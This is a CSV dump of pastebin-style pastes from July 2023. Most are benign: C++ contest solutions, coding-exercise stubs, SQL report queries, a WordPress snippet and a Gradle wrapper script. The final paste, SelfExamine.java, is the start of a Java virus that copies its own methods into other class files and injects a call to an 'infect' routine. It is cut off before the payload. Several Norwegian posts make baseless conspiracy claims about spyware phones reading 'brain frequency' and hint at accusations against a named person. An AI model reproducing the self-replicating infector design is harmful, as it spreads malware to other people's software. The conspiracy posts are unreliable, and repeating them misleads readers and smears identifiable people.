id,title,username,language,date,content
T1dLA4GH,F,Salvens,C++,Thursday 27th of July 2023 04:16:29 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>
#include <deque>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    vector<int> a(n);
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
    }
    vector<int> l(n, -1), r(n, n);
    vector<int> st;
    for (int i = n - 1; i >= 0; --i) {
        while (!st.empty() && a[i] < a[st.back()]) {
            l[st.back()] = i;
            st.pop_back();
        }
        st.push_back(i);
    }

    st.clear();
    for (int i = 0; i < n; ++i) {
        while(!st.empty() && a[i] < a[st.back()]) {
            r[st.back()] = i;
            st.pop_back();
        }
        st.push_back(i);
    }
    int ans = 0;
    for (int i = 0; i < n; ++i) {
        ans = max(ans, a[i] * (r[i] - (l[i] + 1)));
    }
    cout << ans << '\n';
}"
nUkPHZZ5,Til ungdommen,rabbnix,C++,Thursday 27th of July 2023 04:13:14 AM CDT,"Til skoleungdommen,  dere blir lurt.
Det er ingen penger å hent.

Sett heller kursen mot simondarres vei. 

Foregår noe utrolig grove greier der.

Ped nek"
rAGpMnSh,Hjernefrekvens3,rabbnix,C++,Thursday 27th of July 2023 04:09:45 AM CDT,"Ikke bruk de telefonene dere har fått utdelt.
Det er pegasus spyware pluss at den tar hjernefrekvensen deres. Dvs hjernens fingeravtrykk..

Alt dette blir brukt mot kåre bull aka sukker

"
numRvcCU,Javascript task,Grifas,JavaScript,Thursday 27th of July 2023 04:00:36 AM CDT,"JavaScript
Task 1
Task: Write a JavaScript function that takes a string as an input parameter and returns the reversed string.

function reverseString(str) {
    // your code 
}


Task 2
Task: Write a JavaScript function that takes an array of numbers as an input parameter and returns a new array where each element is the square of the corresponding element from the original array.

function squareArray(arr) {
    // your code 
"
vYAz3Bmi,PHP tasks,Grifas,PHP,Thursday 27th of July 2023 03:57:59 AM CDT,"PHP
Task 1
Task: Write a PHP function that determines whether the given number is prime (a prime number is a natural number greater than 1 that is divisible only by 1 and itself).

// Code with the task
function isPrime($number) {
    // your code to check for prime number
}


Task 2
Task: You have an array of numbers. Write a PHP function that returns the sum of all elements in the array.

// Code with the task
function sumArray($arr) {
    // your code to calculate the sum of array elements
}
"
ngsV3V4J,Untitled,dimas_subaktianto,Oracle 8,Thursday 27th of July 2023 03:53:35 AM CDT,"SELECT
BK_CD
,US_FI.GETCDNM(BK_CD) AS BK_NM
,ACNT_NO
,FOO.USAHA_CD
,US_FI.GETCDNM(${place}) AS USAHA_NM
,'PERIODE ' || TO_CHAR(TO_DATE(${sDate},'YYYYMMDD'),'DD/MM/YYYY') || ' s/d ' || TO_CHAR(TO_DATE(${eDate},'YYYYMMDD'),'DD/MM/YYYY') AS PER_VIEW
,FOO.USE_CURY
,US_FI.GETCDNM(USE_CURY) AS USE_CURY_NM
,OSD_COA_CD
,SUM(BAL_AMT) + SUM(DECODE(IO_TP,'A',SA_AMT,-SA_AMT)) AS SABAL_AMT
,SUM(BAL_AMT) AS BAL_AMT
,SUM(DECODE(IO_TP,'A',SA_AMT,-SA_AMT)) AS SA_AMT
,SUM(DECODE(IO_TP,'A',IN_AMT,0)) AS IN_AMT_A
,SUM(DECODE(IO_TP,'B',IN_AMT,0)) AS IN_AMT_B
,SUM(DECODE(IO_TP,'A',OUT_AMT,0)) AS OUT_AMT_A
,SUM(DECODE(IO_TP,'B',OUT_AMT,0)) AS OUT_AMT_B
,SUM(DECODE(IO_TP,'A',TAK_AMT,0)) AS TAK_AMT_A
,SUM(DECODE(IO_TP,'B',TAK_AMT,0)) AS TAK_AMT_B
,SUM(DECODE(IO_TP,'A',LAIN_AMT,0)) AS LAIN_AMT_A
,SUM(DECODE(IO_TP,'B',LAIN_AMT,0)) AS LAIN_AMT_B
FROM
(
    SELECT
    A.BK_CD
    ,A.ACNT_NO
    ,A.OSD_COA_CD
    ,A.USAHA_CD
    ,A.DEPT_CD
    ,A.USE_CURY
    ,B.IO_TP
    ,B.SLIP_NO
    ,C.ROW_SUM
    ,C.COA_CD
    ,D.STAT_DMT
    ,0 AS BAL_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(SUBSTR(${sDate},0,4)||'0101','YYYYMMDD') AND TO_DATE(${sDate},'YYYYMMDD')-1  THEN
    ROW_SUM
    ELSE
    0
    END SA_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')  THEN
        DECODE(SUBSTR(COA_CD,0,1),'4',ROW_SUM,0)
    ELSE
        0
    END IN_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')   THEN
        DECODE(SUBSTR(COA_CD,0,1),'5',ROW_SUM,0)
    ELSE
        0
    END OUT_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')   THEN
        DECODE(SUBSTR(COA_CD,0,3),'117',ROW_SUM,'118',ROW_SUM,0)
    ELSE
        0
    END TAK_AMT
    ,CASE WHEN
    
     TRUNC(STAT_DMT) BETWEEN TO_DATE(${sDate},'YYYYMMDD') AND TO_DATE(${eDate},'YYYYMMDD')   THEN
        DECODE(SUBSTR(COA_CD,0,1),'4',0,'5',0,DECODE(SUBSTR(COA_CD,0,3),'117',0,'118',0,ROW_SUM))
    ELSE
        0
    END LAIN_AMT
    FROM
    TBFI_BK_ACNT A
    ,TBFI_SLIP B
    ,TBFI_SLIP_DETL C
    ,TBFI_SLIP_STAT D
    WHERE A.USE_YN = 'Y'
    AND B.SLIP_NO = C.SLIP_NO
    AND B.SLIP_NO = D.SLIP_NO
    AND B.PROC_STAT = D.PROC_STAT
    AND A.USAHA_CD LIKE '%' || ${place} || '%'
    AND B.PROC_STAT = 'A2802'
    AND A.BK_CD= B.BK_CD
    AND A.ACNT_NO = B.ACNT_NO
    UNION ALL
    (
    SELECT 
     A.BK_CD
        ,A.ACNT_NO
        ,A.OSD_COA_CD
        ,A.USAHA_CD
        ,A.DEPT_CD
        ,A.USE_CURY
        ,'' IO_TP
        ,'' SLIP_NO
        ,0 ROW_SUM
        ,Y.COA_CD
        ,TO_DATE(${sDate},'YYYYMMDD') STAT_DMT
        ,SUM(BAL_AMT) AS BAL_AMT
        ,0
        ,0
        ,0
        ,0
        ,0
    FROM 
    TBFI_BK_ACNT A
    , TBFI_BAL Y
    WHERE
    A.OSD_COA_CD = Y.COA_CD
    AND ACNT_YEAR = SUBSTR(${sDate},0,4)
    AND  A.USE_YN = 'Y'
    AND A.USE_CURY = Y.USE_CURY
     AND A.USAHA_CD LIKE '%' || ${place} || '%'
    GROUP BY
    A.BK_CD
        ,A.ACNT_NO
        ,A.OSD_COA_CD
        ,A.USAHA_CD
        ,A.DEPT_CD
        ,A.USE_CURY
        ,Y.COA_CD
    )
) FOO
GROUP BY
FOO.BK_CD
,FOO.ACNT_NO
,FOO.OSD_COA_CD
,FOO.USE_CURY
,FOO.USAHA_CD"
puXE6Fxm,D,Salvens,C++,Thursday 27th of July 2023 03:47:35 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>
#include <deque>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin >> n;
    deque<int> a(n);
    vector<bool> used1(n + 1), used2(n + 2);
    stack<int> st;
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
        used1[a[i]] = true;
    }
    vector<pair<int, int>> ans;
    int cur = 1;
    while (cur <= n) {
        if (used1[cur]) {
            int cnt = 0;
            while (a[0] != cur) {
                st.push(a[0]);
                used1[a[0]] = false;
                used2[a[0]] = true;
                a.pop_front();
                ++cnt;
            }
            st.push(a[0]);
            used1[a[0]] = false;
            used2[a[0]] = true;
            a.pop_front();
            ++cnt;
            ans.emplace_back(1, cnt);
            ans.emplace_back(2, 1);
            st.pop();
            ++cur;
        } else if (used2[cur]) {
            if (st.top() != cur) {
                cout << 0 << '\n';
                return 0;
            }
            ans.emplace_back(2, 1);
            used2[cur] = false;
            st.pop();
            ++cur;
        }
    }
    vector<pair<int, int>> ans1 = {ans[0]};
    for (int i = 1; i < ans.size(); ++i) {
        if (ans1.back().first == ans[i].first) {
            ++ans1.back().second;
        } else {
            ans1.emplace_back(ans[i]);
        }
    }
    for (auto& [x, y]: ans1) {
        cout << x << ' ' << y << '\n';
    }
}"
RbuYhQ2U,What name or inspect or nan,A_GUES,JavaScript,Thursday 27th of July 2023 03:35:26 AM CDT,"javascript:(function () { 
    var script = document.createElement('script'); 
    script.src = ""//cdn.jsdelivr.net/npm/eruda""; 
    document.body.appendChild(script); 
    script.onload = function () { 
        eruda.init() 
    } 
})();"
gaN4e0pR,Planting,rabbnix,C++,Thursday 27th of July 2023 03:26:04 AM CDT,"Borettslaget har åpnet en av kåres gammle Facebook profiler.
Som de skriver dritt i.

Alt kåre skriver blir redigert."
u2TLZfnD,B,Salvens,C++,Thursday 27th of July 2023 03:18:09 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

int make_op(int a, int b, char op) {
    if (op == '+') {
        return a + b;
    }
    if (op == '-') {
        return a - b;
    }
    if (op == '*') {
        return a * b;
    }
}

int convert(string& s) {
    int ans = 0;
    for (auto& i: s) {
        ans *= 10;
        ans += (int)(i - '0');
    }
    return ans;
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    stack<int> st;
    string s;
    while (cin >> s) {
        if (s[0] >= '0' && s[0] <= '9') {
            st.push(convert(s));
        } else {
            int a = st.top();
            st.pop();
            int b = st.top();
            st.pop();
            swap(a, b);
            st.push(make_op(a, b, s[0]));
        }
    }
    cout << st.top() << '\n';
}"
xD6QU1va,Untitled,ramzes4,MySQL,Thursday 27th of July 2023 02:57:49 AM CDT,"SELECT
	assignment_conditions.id,
	assignment_conditions.payment,
	assignment_conditions.delivery,
	assignment_conditions_spd.spd_id,
	assignment_conditions_spd.weight
FROM
	`yii_doc`.`assignment_conditions`
	LEFT JOIN assignment_conditions_spd ON assignment_conditions_spd.assignment_conditions_id = assignment_conditions.id 
WHERE
	assignment_conditions.payment = '0' 
	AND assignment_conditions.delivery = '3'
	AND assignment_conditions.active = 1
	AND assignment_conditions_spd.active = 1"
CBwFVAt4,A,Salvens,C++,Thursday 27th of July 2023 02:57:26 AM CDT,"#include <array>
#include <iostream>
#include <vector>
#include <stack>

using namespace std;

#define int long long

const long long INF = 1e18 + 7;
const int MAXN = 2e5 + 10;
const int N = 2e5;

char invert(char c) {
    if (c == ')') {
        return '(';
    }
    if (c == ']'){
        return '[';
    }
    if (c == '}') {
        return '{';
    }
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    string s;
    cin >> s;
    stack<char> st;
    for (int i = 0; i < s.size(); ++i) {
        if (s[i] == '(' || s[i] == '[' || s[i] == '{') {
            st.push(s[i]);
        } else {
            if (st.empty() || invert(s[i]) != st.top()) {
                cout << ""no\n"";
                return 0;
            } else {
                st.pop();
            }
        }
    }
    cout << (st.empty() ? ""yes\n"": ""no\n"");
}"
kdPVW0yX,Untitled,ramzes4,MySQL,Thursday 27th of July 2023 02:53:56 AM CDT,"SELECT
	assignment_conditions_sale.id,
	assignment_conditions_sale.payment,
	assignment_conditions_sale.delivery,
	assignment_conditions_sale_spd.spd_id,
	assignment_conditions_sale_spd.weight 
FROM
	`yii_doc`.`assignment_conditions_sale`
	LEFT JOIN assignment_conditions_sale_spd ON assignment_conditions_sale_spd.assignment_conditions_sale_id = assignment_conditions_sale.id 
WHERE
	assignment_conditions_sale.payment = '0' 
	AND assignment_conditions_sale.delivery = '3' 
	AND assignment_conditions_sale.active = 1 
	AND assignment_conditions_sale_spd.active = 1"
LRYKuuDX,Untitled,wclovers,PHP,Thursday 27th of July 2023 02:48:44 AM CDT,"// Sort Store taxonomy in alphabetical order
add_filter( 'wcfm_vendor_store_taxomonies', function( $taxonomies, $vendor_id, $taxonomy ) {
    $terms = [];
    foreach( $taxonomies as $term_id => $termArray ) {
        $term = get_term( absint( $term_id ), $taxonomy );
        $terms[$term_id] = isset( $term->name ) ? $term->name : '';
    }
    asort($terms);

    foreach( $terms as $term_id => $term ) {
        $terms[$term_id] = $taxonomies[$term_id];
    }

    return $terms;
}, 10, 3 );"
P9FcraW2,gradlew.bat,FlyFar,Batch,Thursday 27th of July 2023 02:19:30 AM CDT,"@if ""%DEBUG%"" == """" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if ""%OS%""==""Windows_NT"" setlocal

set DIRNAME=%~dp0
if ""%DIRNAME%"" == """" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS=""-Xmx64m""

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if ""%ERRORLEVEL%"" == ""0"" goto init

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:""=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist ""%JAVA_EXE%"" goto init

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:init
@rem Get command-line arguments, handling Windows variants

if not ""%OS%"" == ""Windows_NT"" goto win9xME_args

:win9xME_args
@rem Slurp the command line arguments.
set CMD_LINE_ARGS=
set _SKIP=2

:win9xME_args_slurp
if ""x%~1"" == ""x"" goto execute

set CMD_LINE_ARGS=%*

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar

@rem Execute Gradle
""%JAVA_EXE%"" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% ""-Dorg.gradle.appname=%APP_BASE_NAME%"" -classpath ""%CLASSPATH%"" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%

:end
@rem End local scope for the variables with windows NT shell
if ""%ERRORLEVEL%""==""0"" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not """" == ""%GRADLE_EXIT_CONSOLE%"" exit 1
exit /b 1

:mainEnd
if ""%OS%""==""Windows_NT"" endlocal

:omega"
yvZSyFKP,SelfExamine.java,FlyFar,Java,Thursday 27th of July 2023 02:18:35 AM CDT,"import org.graalvm.compiler.nodes.memory.Access;

import java.io.*;
import java.lang.invoke.MethodHandles;
import java.nio.ByteBuffer;
import java.nio.file.AccessDeniedException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Properties;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipException;


public class SelfExamine{
    /**
     * Basic algorithm: Read ourself, read our own methods to copy them,
     * find main in the target class, inject our methods and inject a
     * call to the infect/copy function
     */

    /**
     * Go through all methods in our parsed class.
     * We are assuming the class we're given is probably us and therefore looking
     * for our own data to copy in preparation for our target.
     *
     * We need to copy from the constant pool:
     *  - Name
     *  - Descriptor
     *  - Items for Method Attributes, Fields. Ugh...
     *
     * How do we want to write this...
     * Something like copyMethods(findOurMethods())?
     *
     * @param parsedClass
     */
    public static void findOurMethods(HashMap<String, Object> parsedClass, HashMap<String, Object> target){
        byte[][] methods = (byte[][]) parsedClass.get(""methods"");
        byte[][] cpool = (byte[][]) parsedClass.get(""constant_pool"");
        ArrayList<String> our_methods = new ArrayList<String>();


        our_methods.add(""findOurMethods"");
        our_methods.add(""copyConstant"");
        our_methods.add(""Cheshire"");
        our_methods.add(""processVerificationTypeInfo"");
        our_methods.add(""parseClassFile"");
        our_methods.add(""instructionIndex"");
        our_methods.add(""processInstructions"");
        our_methods.add(""processAttribute"");
        our_methods.add(""getUtf8Constant"");
        our_methods.add(""addToPool"");
        our_methods.add(""classBytes"");
        our_methods.add(""copyMethod"");
        our_methods.add(""getMethodName"");
        our_methods.add(""getClassName"");
        our_methods.add(""isInfected"");
        our_methods.add(""searchFile"");


        //Loop through our methods and find the ones we're interested in
